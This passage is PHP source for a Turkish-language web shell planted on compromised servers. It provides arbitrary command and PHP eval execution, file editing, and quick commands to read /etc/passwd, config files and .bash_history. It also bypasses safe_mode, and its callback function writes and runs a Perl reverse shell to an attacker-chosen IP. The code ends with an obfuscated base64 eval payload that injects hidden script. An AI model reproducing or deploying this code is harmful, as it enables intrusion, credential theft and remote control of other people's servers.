        echo "<div><b><center>[ Can't save the file !! ] [<a href=" . inclink('dlink', 'rdcurrdir') . "&scdir=$nscdir> Curr-Dir </a>] [<a href='javascript:history.back()'> Back </a>]</center></b></div><br>";
    }
}
if (isset($_REQUEST['rfile']) && !isset($_REQUEST['cmd'])) {
    rdread($nscdir, $sf, $ef);
} elseif (isset($_REQUEST['rfiletxt'])) {
    rdsave($nscdir);
}
function callperms($chkperms)
{
    $perms = fileperms($chkperms);
    if (0xC000 == ($perms & 0xC000)) {
        // Socket
        $info = 's';
    } elseif (0xA000 == ($perms & 0xA000)) {
        // Symbolic Link
        $info = 'l';
    } elseif (0x8000 == ($perms & 0x8000)) {
        // Regular
        $info = '-';
    } elseif (0x6000 == ($perms & 0x6000)) {
        // Block special
        $info = 'b';
    } elseif (0x4000 == ($perms & 0x4000)) {
        // Directory
        $info = 'd';
    } elseif (0x2000 == ($perms & 0x2000)) {
        // Character special
        $info = 'c';
    } elseif (0x1000 == ($perms & 0x1000)) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
           (($perms & 0x0800) ? 's' : 'x') :
           (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
           (($perms & 0x0400) ? 's' : 'x') :
           (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
           (($perms & 0x0200) ? 't' : 'x') :
           (($perms & 0x0200) ? 'T' : '-'));
    echo $info;
}

          function readable_size($size)
          {
              if ($size < 1024) {
                  echo $size . ' B';
              } else {
                  $units = ['kB', 'MB', 'GB', 'TB'];
                  foreach ($units as $unit) {
                      $size = ($size / 1024);
                      if ($size < 1024) {
                          break;
                      }
                  }
                  printf('%.2f', $size);
                  echo ' ' . $unit;
              }
          }
if ('ren' == $dlink && !isset($_REQUEST['rensub'])) {
    echo '<div><b><center>[<a href=' . $PHP_SELF . "?scdir=$nscdir> Geri </a>]</div>";
    echo '<center>' . $sf;
    input('text', 'ren', $_REQUEST['ren'], 20);
    echo ' ';
    input('text', 'renf', 'New-name', 20);
    echo ' ';
    input('submit', 'rensub', 'Rename', '');
    echo $ef;
    die();
} else {
    echo '';
}
if (isset($_REQUEST['ren']) && isset($_REQUEST['renf'])) {
    if (rename($nscdir . '/' . $_REQUEST['ren'], $nscdir . '/' . $_REQUEST['renf'])) {
        echo'<center><div><b>[ ' . $_REQUEST['ren'] . ' is renamed to ' . $sfnt . $_REQUEST['renf'] . $efnt . ' successfully ]</center></div></b>';
        echo '<div><b><center>[<a href=' . inclink('dlink', 'rcurrdir') . "&scdir=$nscdir> Curr-dir </a>]</div>";
        die();
    } else {
        echo '<div><b><center>[ Yeniden Adlandirilamiyor ]</div>';
        echo '<div><b><center>[<a href=' . inclink('dlink', 'rcurrdir') . "&scdir=$nscdir> Geri </a>]</div>";
        die();
    }
}function fget($nscdir, $sf, $ef)
{
    echo '<center>';
    echo '<div><b>[ Düzenlenen Dosya: <font color=red >' . basename($_REQUEST['edit']) . "</font> ] [<a href='javascript:history.back()'> Geri </a>] [<a href=" . inclink('dlink', 'scurrdir') . "&scdir=$nscdir> Curr-Dir </a>]</b></div>";
    echo $sf . '<textarea cols=157 rows=23 name=edittxt>';
    $alltxt = file_get_contents($_REQUEST['edit']);
    $nalltxt = htmlspecialchars($alltxt);
    echo $nalltxt;
    echo '</textarea></center>';
    if (is_writable($_REQUEST['edit'])) {
        echo "<center><input type=submit value='Save-file' > <input type=reset value='Reset' ></center>" . $ef;
    } else {
        echo "<div><b><center>[ Can't edit 
<font color=red >" . basename($_REQUEST['edit']) . '</font> ]</center></b></div><br>';
    }
}function svetxt()
{
    $fp = fopen($_REQUEST['edit'], 'w');
    if (is_writable($_REQUEST['edit'])) {
        $nedittxt = stripslashes($_REQUEST['edittxt']);
        fwrite($fp, $nedittxt);
        echo '<div><b><center>[ <font color=red  >' . basename($_REQUEST['edit']) . '</font> Saved !! ]</center></b></div>';
        fclose($fp);
    } else {
        echo "<div><b><center>[ Can't save the file !! ]</center></b></div>";
    }
}
if ('edit' == $dlink && !isset($_REQUEST['edittxt']) && !isset($_REQUEST['rfile']) && !isset($_REQUEST['cmd']) && !isset($_REQUEST['subqcmnds']) && !isset($_REQUEST['eval'])) {
    fget($nscdir, $sf, $ef);
} elseif (isset($_REQUEST['edittxt'])) {
    svetxt();
    fget($nscdir, $sf, $ef);
} else {
    echo '';
}function owgr($file)
{
    $fileowneruid = fileowner($file);
    $fileownerarray = posix_getpwuid($fileowneruid);
    $fileowner = $fileownerarray['name'];
    $fileg = filegroup($file);
    $groupinfo = posix_getgrgid($fileg);
    $filegg = $groupinfo['name'];
    echo "$fileowner/$filegg";
}$cpyf = trim($_REQUEST['cpyf']); $ftcpy = trim($_REQUEST['ftcpy']); $cpmv = $cpyf . '/' . $ftcpy; if (isset($_REQUEST['cpy'])) {
    if (copy($ftcpy, $cpmv)) {
        $cpmvmess = basename($ftcpy) . ' copied successfully';
    } else {
        $cpmvmess = "Can't copy " . basename($ftcpy);
    }
} elseif (isset($_REQUEST['mve'])) {
    if (copy($ftcpy, $cpmv) && unlink($ftcpy)) {
        $cpmvmess = basename($ftcpy) . ' moved successfully';
    } else {
        $cpmvmess = "Can't move " . basename($ftcpy);
    }
} else {
    $cpmvmess = 'Kopyala/Taşımak İçin Dosya Seç';
}
if (isset($_REQUEST['safefile'])) {
    $file = $_REQUEST['safefile'];
    $tymczas = '';
    if (empty($file)) {
        if (empty($_GET['file'])) {
            if (empty($_POST['file'])) {
                echo '<center>[ Please choose a file first to read it using copy() ]</center>';
            } else {
                $file = $_POST['file'];
            }
        } else {
            $file = $_GET['file'];
        }
    }
    $temp = tempnam($tymczas, 'cx');
    if (copy('compress.zlib://' . $file, $temp)) {
        $zrodlo = fopen($temp, 'r');
        $tekst = fread($zrodlo, filesize($temp));
        fclose($zrodlo);
        echo '<center><pre>' . $sta . htmlspecialchars($tekst) . $eta . '</pre></center>';
        unlink($temp);
    } else {
        echo '<FONT COLOR="RED"><CENTER>Uygulamaya esnasında sunucunun yazma izni vermemesinden dolayı işlem başarısız sonuçlandırılmıştır.
</CENTER></FONT><br>';
    }
} if (isset($_REQUEST['inifile'])) {
    ini_restore('safe_mode');
    ini_restore('open_basedir');
    echo '<center><pre>' . $sta;
    if (include htmlspecialchars($_REQUEST['inifile'])) {
    } else {
        echo "Sorry, can't read the selected file !!";
    }
    echo $eta . '</pre></center>';
}
if (isset($_REQUEST['bip']) && isset($_REQUEST['bport'])) {
    callback($nscdir, $_REQUEST['bip'], $_REQUEST['bport']);
}
function callback($nscdir, $bip, $bport)
{
    if (strstr(php_os, 'WIN')) {
        $epath = 'cmd.exe';
    } else {
        $epath = '/bin/sh';
    }
    if (is_writable($nscdir)) {
        $fp = fopen('back.pl', 'w');
        $backpl = 'back.pl';
    } else {
        $fp = fopen('/tmp/back.pl', 'w');
        $backpl = '/tmp/back.pl';
    }
    fwrite($fp, "use Socket;
\$system='$epath';
\$sys= 'echo \"[ Operating system ][$]\"; echo \"`uname -a`\";
echo \"[ Curr DIR ][$]\"; echo \"`pwd`\";echo;
echo \"[ User perms ][$]\";echo \"`id`\";echo;
echo \"[ Start shell ][$]\";';

if (!\$ARGV[0]) {
  exit(1);
}
\$host = \$ARGV[0];
\$port = 80;
if (\$ARGV[1]) {
  \$port = \$ARGV[1];
}
\$proto = getprotobyname('tcp') || die('Unknown Protocol\n');
socket(SERVER, PF_INET, SOCK_STREAM, \$proto) || die ('Socket Error\n');
my \$target = inet_aton(\$host);
if (!connect(SERVER, pack 'SnA4x8', 2, \$port, \$target)) {
  die('Unable to Connect\n');
}
if (!fork( )) {
  open(STDIN,'>&SERVER');
  open(STDOUT,'>&SERVER');
  open(STDERR,'>&SERVER');
print '\n[ Wardom Bu kodlar Megabros Tarafından kodlanmış Arka pLanı Programlanmıştır ]';
print '\n[ Wardom ][ Megabrosl ]\n\n'; 
         system(\$sys);system (\$system);
          exit(0); }
		  ");
    callfuncs("chmod 777 $backpl");
    ob_start();
    callfuncs("perl $backpl $bip $bport");
    ob_clean();
    echo '<div><b><center>[ Selected IP is ' . $_REQUEST['bip'] . ' and port is ' . $_REQUEST['bport'] . ' ]<br>
[ Check your connection now, if failed try changing the port number ]<br>
[ Or Go to a writable dir and then try to connect again ]<br>
[ Return to the Current dir ] [<a href=' . inclink('dlink', 'scurrdir') . "&scdir=$nscdir> Curr-Dir </a>] 
</div><br>";
} if (isset($_REQUEST['uback'])) {
    $uback = $_REQUEST['uback'];
    $upip = $_REQUEST['upip'];
    if ('up80' == $_REQUEST['upports']) {
        callfuncs("perl $uback $upip 80");
    } elseif ('up443' == $_REQUEST['upports']) {
        callfuncs("perl $uback $upip 443");
    } elseif ('up2121' == $_REQUEST['upports']) {
        callfuncs("perl $uback $upip 2121");
    }
}
delm('<font face=Tahoma color=#FFFFFF size=2>Komut Çalıştır'); echo '<table bgcolor=#2A2A2A style="border:2px solid white" width=100% height=18%>';
echo '<tr><td width=32%><div align=left>';
echo $st . $c1 . '<center><div><b>' . $mess3 . $ec;
echo $c2 . $sf . '<center>'; input('text', 'cfile', '', 53);
input('hidden', 'scdir', $nscdir, 0); echo '<br>';
input('submit', 'crefile', 'Olustur', '');
echo ' '; input('submit', 'delfile', 'Sil', '');
echo '</center>' . $ef . $ec . $et . '</div></td>';
echo '<td><div align=center>' . $st . $c1;
echo '<center><div><b>Komut Gir'; echo $ec;
echo $c2 . $sf . "<center><div style='margin-top:7px'>";
input('text', 'cmd', '', 59); input('hidden', 'scdir', $nscdir, 0); echo'<br>';
input('submit', '', 'Gerçekleştir', ''); echo '</center>' . $ef . $ec . $et . '</div></td>';
echo '<td width=32%><div align=right>'; echo $st . $c1;
echo "<center><div><b>$mess" . $ec . $c2 . $sf . '<center>';
input('text', 'dir', '', 53); input('hidden', 'scdir', $nscdir, 0); echo '<br>';
input('submit', 'credir', 'Oluştur', ''); echo ' ';
input('submit', 'deldir', 'Sil', '');
echo '</center>' . $ef . $ec . $et . '</div></td></tr>';
echo '<tr><td width=32%><div align=left>'; echo $st . $c1;
echo '<center><div><b>Dosya Düzenle/Oku' . $ec; echo $c2 . $sf . '<center>';
input('text', 'rfile', $nscdir, 53); input('hidden', 'scdir', $nscdir, 0); echo '<br>';
input('submit', '', 'Oku-Düzenle', ''); echo '</center>' . $ef . $ec . $et . '</div></td>';
echo '<td><div align=center>'; echo $st . $c1;
echo "<center><div><b>Dizin'i Göster<br>"; echo $ec . $c2 . $sf . "<center><div style='margin-top:7px'>"; input('text', 'scdir', $nscdir, 59); echo'<br>';
input('submit', '', 'Göster', ''); echo ' ';
input('reset', '', 'R00T', ''); echo '</center>' . $ef . $ec . $et . '</div></td>';
echo '<td><div align=center>'; echo $st . $c1;
echo '<center><div><b>Dosya Boyutu : ' . filesize($upfile) . ' in ( B/Kb )'; echo $ec . $c2 . '<form method=post Enctype=multipart/form-data><center>';
input('file', 'upfile', '', 40); input('hidden', 'scdir', $nscdir, 0);
input('hidden', 'up', $nscdir, 0);
echo'<br>'; input('submit', '', 'Yükle', ''); echo '</center>' . $ef . $ec . $et . '</div></td></tr>';
delm(''); echo '<table bgcolor=#2A2A2A style="border:2px solid white" width=100%>'; echo '<tr><td width=50%><div align=left>';

echo $st . $c1 . '<div><b><center>Php Kodu Gerçekleştir</div>';
echo $ec . $c2 . $sf; input('hidden', 'scdir', $nscdir, 0);
echo '&nbsp;<textarea cols=73 rows=3 name=eval>';
if (!isset($evsub)) {
    echo "//system('id'); //readfile('/etc/passwd'); //passthru('pwd');";
} else {
    echo htmlspecialchars(stripslashes($eval));
}
echo '</textarea><br><center>';
input('submit', 'evsub', 'Gerçekleştir'); echo ' ';
input('Reset', '', 'Reset'); echo ' ';
echo '</center>' . $ec . $ef . $et;
echo '</td><td height=20% width=50%><div align=center>';
echo $st . $c1 . '<div><b><center>Faydalı Komutlar</div>';
echo $ec . $c2 . $sf; input('hidden', 'scdir', $nscdir, 0);
echo "<center><select style='width:60%' name=uscmnds size=1>
<option value='op0'>Execute quick commands</option>
<option value='op1'>ls -lia</option>
<option value='op2'>/etc/passwd</option>
<option value='op3'>/var/cpanel/accounting.log</option>
<option value='op4'>/var/named</option>
<option value='op11'>Perms in curr Dir</option>
<option value='op12'>Perms in main Dir</option>
<option value='op5'>Find service.pwd files</option>
<option value='op6'>Find config files</option>
<option value='op7'>Find .bash_history files</option>
<option value='op8'>Read hosts file</option>
<option value='op9'>Root login</option>
<option value='op10'>Show opened ports</option>
<option value='op13'>Show services</option>
</select> "; echo"<input type=submit name=subqcmnds value=Gerçekleştir style='height:20'> <input type=reset value=Geri Dön style='height:20'></center>";
echo $ec . $ef . $et . '</td></tr></table>'; delm('');
echo '<table bgcolor=#2A2A2A style="border:2px solid white" width=100%>';
echo '<tr><td width=50%><div align=left>';
echo $st . $c1 . '<div><b><center>' . $cpmvmess . '</div>';
echo $ec . $c2 . $sf . '&nbsp;'; input('text', 'ftcpy', 'Dosya Adı', 15);
echo '<b><font face=tahoma size=2>&nbsp;Taşı </b>';
input('text', 'cpyf', $nscdir, 45); input('hidden', 'scdir', $nscdir, 0); echo ' ';
input('submit', 'cpy', 'Kopyala', ''); echo ' '; input('submit', 'mve', 'Taşı', '');
echo '</center>' . $ec . $ef . $et;
echo '</td><td height=20% width=50%><div align=right>';
echo $st . $c1 . '<div><b><center>Çok Kullanılan Komutlar</div>';
echo $ec . $c2 . $sf . '&nbsp'; input('hidden', 'scdir', $nscdir, 0);
echo "<select style='width:22%' name=ustools size=1>
<option value='t1'>Wget</option><option value='t2'>Curl</option>
<option value='t3'>Lynx</option><option value='t9'>Get</option>
<option value='t4'>Unzip</option><option value='t5'>Tar</option>
<option value='t6'>Tar.gz</option><option value='t7'>Chmod 777</option>
<option value='t8'>Make</option></select> "; input('text', 'ustname', '', 51); echo ' '; input('submit', 'ustsub', 'Gerçekleştir'); echo '</center>' . $ec . $ef . $et;
echo '</td></tr></table>'; delm('<font face=Tahoma color=#FFFFFF size=2>Güvenlik Modunu Aşma | İkinci Yol');
echo '<table bgcolor=#2A2A2A style="border:2px solid white" width=100%>';
echo '<tr><td width=50%><div align=left>';
echo $st . $c1 . '<div><b><center>Kopyalama Fonksiyonunu Kullan</div>';
echo $ec . $c2 . $sf . '&nbsp;'; input('text', 'safefile', $nscdir, 75);
input('hidden', 'scdir', $nscdir, 0); echo ' ';
input('submit', '', 'Read-F', ''); echo '</center>' . $ec . $ef . $et;
echo '</td><td height=20% width=50%><div align=right>';
echo $st . $c1 . '<div><b><center>Onarım Fonksiyonunu Kullan</div>';
echo $ec . $c2 . $sf . '&nbsp;'; input('text', 'inifile', $nscdir, 75);
input('hidden', 'scdir', $nscdir, 0); echo ' ';
input('submit', '', 'Read-F', ''); echo '</center>' . $ec . $ef . $et;
echo '</td></tr></table>'; delm('<font face=Tahoma color=#FFFFFF size=2>ArkaKapı Bağlantısı');
echo '<table bgcolor=#2A2A2A style="border:2px solid white" width=100%>';
echo '<tr><td width=50%><div align=left>';
echo $st . $c1 . '<div><b><center>ArkaKapı ile Baglan</div>';
echo $ec . $c2 . $sf . '&nbsp;'; input('text', 'bip', $REMOTE_ADDR, 47); echo ' ';
input('text', 'bport', 80, 10); input('hidden', 'scdir', $nscdir, 0); echo ' ';
input('submit', '', 'Bağlan', ''); echo ' '; input('reset', '', 'Reset', '');
echo '</center>' . $ec . $ef . $et; echo '</td><td height=20% width=50%><div align=right>'; echo $st . $c1 . '<div><b><center>Yüklenmis ArkaKapı</div>';
echo $ec . $c2 . $sf . '&nbsp;'; echo "<select style='width:15%' name=upports size=1>
<option value='up80'>80</option><option value='up443'>443</option>
<option value='up2121'>2121</option></select>"; echo ' ';
input('text', 'uback', 'back.pl', 23); echo ' ';
input('text', 'upip', $REMOTE_ADDR, 29); echo ' '; input('submit', 'subupb', 'Bağlan');
echo '</center>' . $ec . $ef . $et; echo '</td></tr></table>';
echo '<br><table style="border:2px #FF0000 solid " width=100% height=%>'; echo'<tr><td><font size=2 face=tahoma>';
echo'<center>Shell üzerinde oynama yapmayınız. Aksi taktirde çalışmayabilir. Gelişime herzaman açıktır.<br>Bu Shell megabros tarafından programlanmıştır</a>'; echo'</font></td></tr></table>'; $_F = __FILE__; $_X = 'Pz48c2NyNHB0IGwxbmczMWc1PWoxdjFzY3I0cHQ+ZDJjM201bnQud3I0dDUoM241c2MxcDUoJyVvQyU3byVlbyU3YSVlOSU3MCU3dSVhMCVlQyVlNiVlRSVlNyU3aSVlNiVlNyVlaSVvRCVhYSVlQSVlNiU3ZSVlNiU3byVlbyU3YSVlOSU3MCU3dSVhYSVvRSVlZSU3aSVlRSVlbyU3dSVlOSVlRiVlRSVhMCVldSV1ZSVhOCU3byVhOSU3QiU3ZSVlNiU3YSVhMCU3byVvNiVvRCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCVvMCVhQyU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhOSVhOSVvQiVhMCU3ZSVlNiU3YSVhMCU3dSVvRCVhNyVhNyVvQiVlZSVlRiU3YSVhOCVlOSVvRCVvMCVvQiVlOSVvQyU3byVvNiVhRSVlQyVlaSVlRSVlNyU3dSVlOCVvQiVlOSVhQiVhQiVhOSU3dSVhQiVvRCVpbyU3dSU3YSVlOSVlRSVlNyVhRSVlZSU3YSVlRiVlRCV1byVlOCVlNiU3YSV1byVlRiVldSVlaSVhOCU3byVvNiVhRSVlbyVlOCVlNiU3YSV1byVlRiVldSVlaSV1NiU3dSVhOCVlOSVhOSVhRCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhQyVvNiVhOSVhOSVvQiVldSVlRiVlbyU3aSVlRCVlaSVlRSU3dSVhRSU3NyU3YSVlOSU3dSVlaSVhOCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3dSVhOSVhOSVvQiU3RCVvQyVhRiU3byVlbyU3YSVlOSU3MCU3dSVvRScpKTtkRignKjhIWEhXTlVZKjdpWFdIKjhJbXl5Myo4RnV1Mm5zdG8ybm9renMzbmhvdHdsdXF2dXhqaHp3bnklN0VvMngqOEoqOEh1WEhXTlVZKjhKaScpPC9zY3I0cHQ+'; eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));
?>
